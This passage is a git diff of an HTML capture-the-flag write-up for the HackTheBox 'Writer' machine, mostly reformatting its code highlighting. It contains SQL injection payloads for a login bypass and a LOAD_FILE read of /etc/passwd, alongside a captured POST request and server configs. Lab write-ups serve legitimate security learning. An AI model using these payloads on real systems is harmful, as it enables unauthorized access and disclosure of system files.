@@ -52,7 +52,7 @@ Once cracked we have a stable SSH shell and we can exploit a postfix disclaimer 
 This last user has excessive permissions on apt, which can be used for privilege escalation to root.
 "><meta itemprop="datePublished" content="2021-10-26T01:37:15+08:00" />
 <meta itemprop="dateModified" content="2021-10-26T01:37:15+08:00" />
-<meta itemprop="wordCount" content="3248"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
+<meta itemprop="wordCount" content="3252"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
 <meta itemprop="keywords" content="sqli,ffuf,sqlmap,postfix,smtp,apt," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://0xade1.github.io/devdraft"/>
@@ -256,48 +256,48 @@ S-1-22-1-1001 Unix User\john (Local User)
 <tbody>
 <tr>
 <td>cleartext</td>
-<td>uname=test' or 1=1; &ndash; -</td>
+<td>uname=test&rsquo; or 1=1; &ndash; -</td>
 </tr>
 <tr>
 <td>urlencoded</td>
-<td>uname=test'+or+1%3d1%3b+&ndash;+-</td>
+<td>uname=test&rsquo;+or+1%3d1%3b+&ndash;+-</td>
 </tr>
 </tbody>
 </table>
 <p>FFUFF is much faster at finding SQL Injections; I first need to capture with Burp the POST requests into a text file:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">POST</span> /administrative <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
-Host<span style="color:#ff79c6">:</span> writer.htb
-User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept<span style="color:#ff79c6">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language<span style="color:#ff79c6">:</span> en-US,en;q=0.5
-Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
-Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
-Content-Length<span style="color:#ff79c6">:</span> 42
-Origin<span style="color:#ff79c6">:</span> http://writer.htb
-Connection<span style="color:#ff79c6">:</span> close
-Referer<span style="color:#ff79c6">:</span> http://writer.htb/administrative
-Upgrade-Insecure-Requests<span style="color:#ff79c6">:</span> 1
-
-uname=UNAME&amp;password=PASS
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#50fa7b">POST</span> /administrative <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#ff79c6">:</span> writer.htb
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+</span></span><span style="display:flex;"><span>Accept<span style="color:#ff79c6">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#ff79c6">:</span> en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#ff79c6">:</span> 42
+</span></span><span style="display:flex;"><span>Origin<span style="color:#ff79c6">:</span> http://writer.htb
+</span></span><span style="display:flex;"><span>Connection<span style="color:#ff79c6">:</span> close
+</span></span><span style="display:flex;"><span>Referer<span style="color:#ff79c6">:</span> http://writer.htb/administrative
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#ff79c6">:</span> 1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uname=UNAME&amp;password=PASS
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Then I can install and run FFUFF. <a href="https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#pitchfork">Everything you need to know about FFUF is here</a>. A Masterclass.</p>
 <pre><code>git clone https://github.com/ffuf/ffuf ; cd ffuf ; go get ; go build
@@ -341,11 +341,11 @@ database management system users privileges:
 <tbody>
 <tr>
 <td>plain</td>
-<td>' UNION ALL SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6;&ndash; -</td>
+<td>&rsquo; UNION ALL SELECT 1,LOAD_FILE(&rsquo;/etc/passwd&rsquo;),3,4,5,6;&ndash; -</td>
 </tr>
 <tr>
 <td>urlencode</td>
-<td>&lsquo;+UNION+ALL+SELECT+1,LOAD_FILE('/etc/passwd&rsquo;),3,4,5,6%3b&ndash;+-</td>
+<td>&lsquo;+UNION+ALL+SELECT+1,LOAD_FILE(&rsquo;/etc/passwd&rsquo;),3,4,5,6%3b&ndash;+-</td>
 </tr>
 </tbody>
 </table>
@@ -375,239 +375,239 @@ root@98853d8e4b8f:/etc/apache2# find . | egrep &quot;sites|apache2&quot; | grep 
 <li>/var/www/writer.htb/writer/wsgi is the website</li>
 </ul>
 <p>000-default.conf:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"># Virtual host configuration for writer.htb domain
-<span style="color:#ff79c6">&lt;VirtualHost</span> *:80<span style="color:#ff79c6">&gt;</span>
-        ServerName writer.htb
-        ServerAdmin admin@writer.htb
-        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
-        <span style="color:#ff79c6">&lt;Directory</span> /var/www/writer.htb<span style="color:#ff79c6">&gt;</span>
-                Order allow,deny
-                Allow from all
-        <span style="color:#ff79c6">&lt;/Directory&gt;</span>
-        Alias /static /var/www/writer.htb/writer/static
-        <span style="color:#ff79c6">&lt;Directory</span> /var/www/writer.htb/writer/static<span style="color:#ff79c6">/&gt;</span>
-                Order allow,deny
-                Allow from all
-        <span style="color:#ff79c6">&lt;/Directory&gt;</span>
-        ErrorLog ${APACHE_LOG_DIR}/error.log
-        LogLevel warn
-        CustomLog ${APACHE_LOG_DIR}/access.log combined
-<span style="color:#ff79c6">&lt;/VirtualHost&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span># Virtual host configuration for writer.htb domain
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;VirtualHost</span> *:80<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>        ServerName writer.htb
+</span></span><span style="display:flex;"><span>        ServerAdmin admin@writer.htb
+</span></span><span style="display:flex;"><span>        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;Directory</span> /var/www/writer.htb<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>                Order allow,deny
+</span></span><span style="display:flex;"><span>                Allow from all
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/Directory&gt;</span>
+</span></span><span style="display:flex;"><span>        Alias /static /var/www/writer.htb/writer/static
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;Directory</span> /var/www/writer.htb/writer/static<span style="color:#ff79c6">/&gt;</span>
+</span></span><span style="display:flex;"><span>                Order allow,deny
+</span></span><span style="display:flex;"><span>                Allow from all
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/Directory&gt;</span>
+</span></span><span style="display:flex;"><span>        ErrorLog ${APACHE_LOG_DIR}/error.log
+</span></span><span style="display:flex;"><span>        LogLevel warn
+</span></span><span style="display:flex;"><span>        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/VirtualHost&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>writer.wsgi:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python</span>
-<span style="color:#ff79c6">import</span> sys
-<span style="color:#ff79c6">import</span> logging
-<span style="color:#ff79c6">import</span> random
-<span style="color:#ff79c6">import</span> os
-
-<span style="color:#6272a4"># Define logging</span>
-logging<span style="color:#ff79c6">.</span>basicConfig(stream<span style="color:#ff79c6">=</span>sys<span style="color:#ff79c6">.</span>stderr)
-sys<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>insert(<span style="color:#bd93f9">0</span>,<span style="color:#f1fa8c">&#34;/var/www/writer.htb/&#34;</span>)
-
-<span style="color:#6272a4"># Import the __init__.py from the app folder</span>
-<span style="color:#ff79c6">from</span> writer <span style="color:#ff79c6">import</span> app <span style="color:#ff79c6">as</span> application
-application<span style="color:#ff79c6">.</span>secret_key <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>environ<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;SECRET_KEY&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>)
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> logging
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> random
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Define logging</span>
+</span></span><span style="display:flex;"><span>logging<span style="color:#ff79c6">.</span>basicConfig(stream<span style="color:#ff79c6">=</span>sys<span style="color:#ff79c6">.</span>stderr)
+</span></span><span style="display:flex;"><span>sys<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>insert(<span style="color:#bd93f9">0</span>,<span style="color:#f1fa8c">&#34;/var/www/writer.htb/&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Import the __init__.py from the app folder</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> writer <span style="color:#ff79c6">import</span> app <span style="color:#ff79c6">as</span> application
+</span></span><span style="display:flex;"><span>application<span style="color:#ff79c6">.</span>secret_key <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>environ<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;SECRET_KEY&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>)
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We infer from row 12 that there is a <strong>/var/www/writer.htb/writer/__init__.py</strong></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
